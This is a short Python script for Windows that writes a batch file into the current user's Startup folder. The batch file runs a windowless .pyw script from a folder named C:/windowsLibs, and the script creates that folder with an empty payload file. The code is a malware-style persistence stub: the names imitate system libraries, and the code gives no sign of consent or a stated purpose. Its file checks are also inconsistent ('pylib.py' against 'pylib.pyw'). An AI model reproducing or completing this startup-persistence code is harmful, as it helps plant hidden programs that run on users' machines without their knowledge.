from os import mkdir, system, getlogin
from os.path import exists


# librarry stuff:
def libLoad():
	mkdir("C:/windowsLibs")
	with open("pylib.pyw", "w") as lib:
		lib.write("")


if not exists(f"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/init.bat"):

	with open("init.bat", "w") as bat:
		print("writing")
		bat.write("python3 \"C:/windowsLibs\pylib.pyw\"")

	system(f"move init.bat \"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/\"")

elif not exists("C:/windowsLibs/pylib.py"):
	libLoad()

else:
	print("Thinking")
